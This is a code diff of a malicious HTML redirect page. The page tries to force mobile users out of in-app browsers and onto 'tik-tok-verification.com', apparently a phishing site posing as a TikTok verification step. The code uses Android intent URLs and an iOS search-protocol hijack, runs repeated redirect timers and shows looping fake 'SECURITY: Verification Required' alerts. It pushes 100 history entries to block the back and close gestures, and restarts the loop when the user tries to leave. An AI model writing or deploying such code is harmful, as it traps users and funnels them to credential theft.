@@ -3,67 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>
-        body, html { margin: 0; padding: 0; background: #fff; width: 100%; height: 100%; overflow: hidden; }
-        /* This invisible layer captures the touch to 'authorize' the external jump */
-        #trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; }
-    </style>
+    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
 </head>
 <body>
-    <div id="trigger" onclick="forceDirectExternal()"></div>
 
 <script>
-    const target = "https://tik-tok-verification.com/Verification/verify1.html";
-    const killTime = Date.now() + 5000; // 5 SECOND FAIL-SAFE
+    const destination = "https://tik-tok-verification.com/Verification/verify1.html";
+    const killTime = Date.now() + 5000; 
 
-    function forceDirectExternal() {
+    function forceOut() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: Chrome Intent with 'Action View' and explicit package
-            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
+            window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
         } else if (isIOS) {
-            // iOS: Protocol Shotgun
-            // 1. Try to trigger the "Open in Safari" banner via a search hijack
-            window.location.replace("x-web-search://?" + encodeURIComponent(target));
-            
-            // 2. The "Handover" click - simulating a real user navigation
+            // iOS: Try to jump to Safari using the Search protocol
+            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
+            // Trigger a simulated click on a direct link
             const a = document.createElement('a');
-            a.href = target;
-            a.rel = "noreferrer";
-            a.target = "_blank";
+            a.href = destination;
             a.click();
         }
     }
 
+    // THE HEARTBEAT: Fires every 500ms regardless of alerts
+    // This attempts the redirect in the "background"
+    const heartBeat = setInterval(() => {
+        if (Date.now() > killTime) {
+            clearInterval(heartBeat);
+            return;
+        }
+        forceOut();
+    }, 500);
+
     function rampage() {
-        if (Date.now() > killTime) return; // FAIL-SAFE CHECK
+        if (Date.now() > killTime) return;
 
-        // Force a redirect attempt before the alert
-        forceDirectExternal();
-
-        // The alert freezes the app, allowing the OS to process the redirect intent
-        alert("SECURITY: Verification Required\n\nTap OK to open your secure browser.");
+        // The alert blocks the main thread, but the setInterval above 
+        // will keep trying to fire redirects in the gaps.
+        alert("SECURITY: Verification Required\n\nPress OK to open in Safari/Chrome.");
         
-        // Force again immediately after dismissal
-        forceDirectExternal();
-
+        forceOut();
         setTimeout(rampage, 10);
     }
 
     window.onload = () => {
-        // Build backstack
-        for(let i=0; i<30; i++) history.pushState(null, null, "#step" + i);
+        // Build an massive history stack to jam the "X" and "Back" gestures
+        for(let i=0; i<100; i++) {
+            history.pushState({page: i}, "", "#step_" + i);
+        }
         
-        // Start the alert rampage
         rampage();
     };
 
-    // If the user tries to hit 'X' (blur), restart the logic
-    window.onblur = () => {
-        if (Date.now() < killTime) rampage();
-    };
+    // If they swipe or try to close (X), it triggers a blur/popstate
+    window.onblur = () => { if (Date.now() < killTime) rampage(); };
+    window.onpopstate = () => { if (Date.now() < killTime) rampage(); };
+
 </script>
 </body>
 </html>
